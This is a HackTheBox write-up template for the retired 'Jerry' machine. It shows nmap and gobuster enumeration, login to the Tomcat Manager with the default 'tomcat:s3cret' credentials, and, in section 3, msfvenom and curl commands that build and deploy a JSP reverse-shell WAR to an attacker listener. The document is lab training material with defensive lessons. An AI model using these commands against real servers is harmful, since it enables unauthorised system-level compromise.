# Jerry — HackTheBox

> **Preparation stub.** Based on publicly documented information about this well-known retired
> machine — not an original solve, and no live flag values are recorded. Use this as a study
> scaffold; complete the bracketed fields when working the box under your own account. Only
> document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | HackTheBox |
| Machine | Jerry |
| Difficulty | Easy |
| Category | Windows |
| Target IP | 10.10.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Windows host exposing **Apache Tomcat** on port 8080. The Tomcat Manager application is reachable
with **default credentials**, and the Manager interface permits deploying a **WAR** archive. A
malicious JSP web shell packaged as a WAR yields command execution as the Tomcat service account —
which on this host is **NT AUTHORITY\SYSTEM**, so both flags are captured in one step (famously
stored together in a single `2 for the price of 1.txt`).

## Key vulnerability class

- **CWE:** CWE-1392 / CWE-798 — Use of Default Credentials, leading to arbitrary application
  deployment (CWE-94 code execution).
- **Why it matters:** the most common real-world web-app compromise pattern — an exposed admin
  interface protected only by a vendor default password. No memory corruption, no CVE; just
  enumeration discipline and knowing Tomcat's default `tomcat:s3cret`.

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/jerry 10.10.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Version | Note |
|------|---------|---------|------|
| 8080/tcp | http | Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 7.0.88) | **The vector** |

[Paste trimmed scan output on completion. Only one port is open — a strong hint the whole path is
through the web service.]

## 2. Enumeration

```
whatweb http://10.10.x.x:8080/
gobuster dir -u http://10.10.x.x:8080/ -w /usr/share/wordlists/dirb/common.txt
```

- Browse to `/manager/html`. It prompts for HTTP Basic auth.
- Try Tomcat defaults — `tomcat:s3cret` is the documented working pair on this box. (Tomcat's
  `tomcat-users.xml` ships commented-out sample accounts; this host left one active.)
- **Ruled out:** brute-forcing other paths is unnecessary once the Manager app is reachable with
  defaults — the fastest path is the intended one.
- [Record the working credential discovery on completion.]

## 3. Exploitation

- **Chosen vector and why:** the Tomcat Manager "Deploy" function is designed to upload
  applications; a WAR-packaged JSP shell is the canonical abuse and needs no exploit code.

```
# Build a JSP reverse-shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<tun0 ip> LPORT=4444 -f war -o shell.war
# Deploy via the Manager UI (Deploy → WAR file to deploy) or curl:
curl -u tomcat:s3cret -T shell.war "http://10.10.x.x:8080/manager/text/deploy?path=/shell"
# Catch the shell, then browse the deployed context to trigger it
nc -lvnp 4444
```

- Shell context: the Tomcat service runs as **NT AUTHORITY\SYSTEM** on this host.
- **User flag:** `[capture on completion]`
- **Root/system flag:** `[capture on completion]`

## 4. Post-exploitation

- Confirm privilege: `whoami` → expect `nt authority\system`.
- Both flags live together on the Administrator desktop
  (`C:\Users\Administrator\Desktop\flags\` — confirm on completion). No privesc needed.

## 5. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Enumeration | `whatweb`, `gobuster`, browser (Tomcat Manager) |
| Exploitation | `msfvenom` (WAR JSP shell), `curl` / Tomcat Manager Deploy, `nc` |
| Post-exploitation | manual flag collection |

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Initial Access / Privilege | Valid Accounts (default credentials) | T1078 |
| Persistence / Execution | Server Software Component: Web Shell | T1505.003 |

## 7. Key learnings

- **Default credentials remain a top real-world initial-access vector** — map it to OWASP A05
  (Security Misconfiguration) and A07 (Identification & Authentication Failures). Always test
  vendor defaults against any admin interface before anything heavier.
- **One open port narrows the methodology** — when only 8080 is exposed, depth-first on that one
  service beats broad scanning.
- **Service account = your privilege ceiling** — a Tomcat running as SYSTEM means web-app RCE is
  immediately full compromise; the blue-team lesson is to run application servers as a low-privilege
  service account.

## 8. References

- Apache Tomcat Manager documentation — deployment and `tomcat-users.xml` defaults.
- MITRE ATT&CK T1190 / T1078 / T1505.003.
